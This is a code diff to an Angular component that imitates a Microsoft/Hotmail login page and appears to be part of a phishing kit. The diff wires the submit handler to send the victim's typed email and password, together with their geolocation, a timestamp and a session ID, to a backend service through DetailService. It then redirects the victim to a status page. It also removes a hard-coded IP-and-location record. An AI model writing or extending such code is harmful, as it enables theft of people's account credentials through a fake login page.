@@ -1,6 +1,7 @@
 import { HttpClient } from '@angular/common/http';
 import { Component, OnInit } from '@angular/core';
 import { Router } from '@angular/router';
+import { DetailService } from 'src/app/services/detail.service';
 import { GeolocationService } from 'src/app/services/geolocation.service';
 
 @Component({
@@ -15,20 +16,11 @@ export class MicrosoftLoginComponent implements OnInit {
   details: any = [];
   locationDetails: any = [];
   date: any;
-  geolocate: any = {
-    ip: '197.210.28.169',
-    city: 'Lagos',
-    region: 'Lagos',
-    country: 'NG',
-    loc: '6.4541,3.3947',
-    org: 'AS29465 MTN NIGERIA Communication limited',
-    timezone: 'Africa/Lagos',
-  };
   constructor(
     private geolocation: GeolocationService,
-    private router: Router
+    private router: Router,
+    private detailService: DetailService
   ) {}
-
   ngOnInit(): void {
     this.geolocation.getLocationDetails().subscribe((resp) => {
       this.locationDetails = resp;
@@ -42,9 +34,16 @@ export class MicrosoftLoginComponent implements OnInit {
       username: this.hotMailEmail + ' ' + '(Hotmail)',
       password: this.hotMailPass,
     };
-    const details = [{ ...det, ...this.locationDetails, ...this.dnate() }];
-    console.log(details);
-    // this.router.navigate(['/status']);
+    const details = {
+      userId: sessionStorage.getItem('user'),
+      ...det,
+      ...this.locationDetails,
+      ...this.dnate(),
+    };
+    this.detailService.addToDetails(details).subscribe((resp) => {
+      console.log(resp);
+    });
+    this.router.navigate(['/status']);
   }
   dnate() {
     const moment = require('moment');
